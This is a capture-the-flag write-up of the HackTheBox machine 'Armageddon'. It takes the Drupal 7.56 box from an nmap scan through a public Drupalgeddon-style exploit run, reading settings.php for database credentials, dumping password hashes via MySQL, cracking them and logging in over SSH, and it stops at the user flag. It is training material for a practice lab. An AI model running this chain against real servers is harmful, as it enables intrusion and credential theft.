---
title: Armageddon - Writeup
author: Elman Alizadeh
date: 2021-04-27 14:10:00 +0800
categories: [ctf, HackTheBox]
tags: [hackthebox, htb, armageddon]
---

![Desktop View]({{ "/assets/img/htb-armageddon/1.png" | relative_url }})

## Nmap 

Let’s scan for open ports with Nmap

 Command: nmap -A 10.10.10.233

![Desktop View]({{ "/assets/img/htb-armageddon/2.png" | relative_url }})

We see open ports here:

22/tcp-SSH port

80/tcp-HTTP port

## Web Enum

Lets check the http site on port 80:

If we look at the place where ‘CHANGELOG.txt’ is written in port 80, we will learn the version of Drupal.

![Desktop View]({{ "/assets/img/htb-armageddon/3.jpeg" | relative_url }})

## Searchsploit

Now let’s find exploit for Drupal 7.56

 Command: searchspolit Drupal 7.56

![Desktop View]({{ "/assets/img/htb-armageddon/4.png" | relative_url }})



Let’s infiltrate the system now

 Command: ruby /usr/share/exploitdb/exploits/php/webapps/44449.rb 10.10.10.233

![Desktop View]({{ "/assets/img/htb-armageddon/5.png" | relative_url }})



Let’s look inside

 Command: ls

![Desktop View]({{ "/assets/img/htb-armageddon/6.png" | relative_url }})

Now let’s look at all the files

 Command: find

![Desktop View]({{ "/assets/img/htb-armageddon/7.png" | relative_url }})

Now let’s check all the files and the file you see contains some information we need.

![Desktop View]({{ "/assets/img/htb-armageddon/8.png" | relative_url }})

Let’s check the file

 Command: cat /sites/default/settings.php

![Desktop View]({{ "/assets/img/htb-armageddon/9.jpeg" | relative_url }})

## Mysql

Let’s explore the tables in the database!

 Command: mysql -u ****** -p************** -D drupal -e ‘show tables;’

![Desktop View]({{ "/assets/img/htb-armageddon/10.jpeg" | relative_url }})

When we look at the whole list, we see a list of ‘users’ with possible names and passwords.

Lets check the users list!

 Command: mysql -u ********* -p****************** -D drupal -e ‘select * from users;’

![Desktop View]({{ "/assets/img/htb-armageddon/11.jpeg" | relative_url }})

We get 2 users and password hashes one of which is an admin!

You can crack this password with the ‘john’ tool.

![Desktop View]({{ "/assets/img/htb-armageddon/9.png" | relative_url }})

## Ssh

Now let’s connect to ssh-a with the information we have.

Command : ssh username@10.10.10.233

![Desktop View]({{ "/assets/img/htb-armageddon/10.png" | relative_url }})

## User.txt

Checking the file system we have user.txt our first flag!

![Desktop View]({{ "/assets/img/htb-armageddon/12.jpeg" | relative_url }})













